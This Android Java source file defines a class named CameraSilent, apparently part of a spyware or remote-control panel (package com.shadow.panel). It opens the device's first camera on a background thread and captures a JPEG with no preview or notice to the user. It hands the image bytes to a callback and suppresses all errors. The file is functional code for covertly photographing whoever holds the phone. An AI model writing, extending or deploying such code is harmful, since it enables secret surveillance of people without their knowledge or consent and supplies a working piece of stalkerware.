package com.shadow.panel;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Size;
import java.nio.ByteBuffer;
import java.util.Collections;
public class CameraSilent {
    public interface Callback { void onCapture(byte[] jpeg); }
    public static void capture(Context ctx, Callback cb) {
        new Thread(() -> {
            try {
                CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
                String camId = cm.getCameraIdList()[0];
                CameraCharacteristics chars = cm.getCameraCharacteristics(camId);
                Size[] sizes = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
                Size size = sizes[0];
                ImageReader reader = ImageReader.newInstance(size.getWidth(), size.getHeight(), ImageFormat.JPEG, 1);
                HandlerThread ht = new HandlerThread("cam");
                ht.start();
                Handler h = new Handler(ht.getLooper());
                reader.setOnImageAvailableListener(r -> {
                    Image img = r.acquireLatestImage();
                    if (img != null) {
                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        img.close();
                        cb.onCapture(bytes);
                    }
                    ht.quitSafely();
                }, h);
                cm.openCamera(camId, new CameraDevice.StateCallback() {
                    @Override public void onOpened(CameraDevice camera) {
                        try {
                            CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            b.addTarget(reader.getSurface());
                            camera.createCaptureSession(Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    try { session.capture(b.build(), null, h); } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession session) {}
                            }, h);
                        } catch (Exception ignored) {}
                    }
                    @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                    @Override public void onError(CameraDevice camera, int error) { camera.close(); }
                }, h);
            } catch (Exception ignored) {}
        }).start();
    }
}
